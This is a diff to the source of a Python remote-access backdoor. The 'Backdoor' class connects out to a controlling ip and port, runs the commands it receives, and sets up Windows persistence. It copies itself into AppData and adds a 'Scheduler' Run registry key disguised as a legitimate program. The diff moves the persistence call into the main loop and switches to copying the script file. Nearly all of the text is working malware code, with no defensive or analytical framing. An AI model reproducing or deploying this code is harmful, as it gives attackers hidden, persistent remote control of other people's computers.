@@ -11,8 +11,6 @@ class Backdoor:
     def __init__(self, ip, port):
         self.sock_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.sock_obj.connect((ip, port))
-        self.persistence()
-
     def exec_system_cmd(self, command):
         try:
             DEVNULL = open(os.devnull,'wb') 
@@ -34,10 +32,11 @@ class Backdoor:
         self.reliable_send("[+] Windows OS detected")
         self.reliable_send("[+] Continuing with Persistence Operations")
         
-        location = os.environ["appdata"]+"\\scheduler.exe"
+        #location = os.environ["appdata"]+"\\scheduler.exe"
+        location = os.environ["appdata"]+"\\client.py"
         if not os.path.exists(location):
-            shutil.copyfile(sys.executable, location) # to copy executable
-            # shutil.copyfile(__file__,location) # [to copy .py file]
+            # shutil.copyfile(sys.executable, location) # to copy executable
+            shutil.copyfile(__file__,location) # [to copy .py file]
             """
             [PERSISTENCE]
                 reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Scheduler /t REG_SZ /d C:/Users/user1/AppData/Roaming/scheduler.exe /f
@@ -46,8 +45,11 @@ class Backdoor:
             """
             try:
                 subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Scheduler /t REG_SZ /d '+location+' /f',shell=True)
+                res = "[+] Successfully added executable to the Registry"
+                return
             except:
                 res = "[+] ERROR - Cannot add executable for persistence"
+                return
 
     def reliable_send(self, data):
         if not isinstance(data, str):
@@ -85,6 +87,7 @@ class Backdoor:
             return "[+] ERROR - Error during creating a file"           
     
     def run(self):
+        self.persistence()
         while True:
             recv_data = self.reliable_receive()
             if recv_data[0] == "exit":
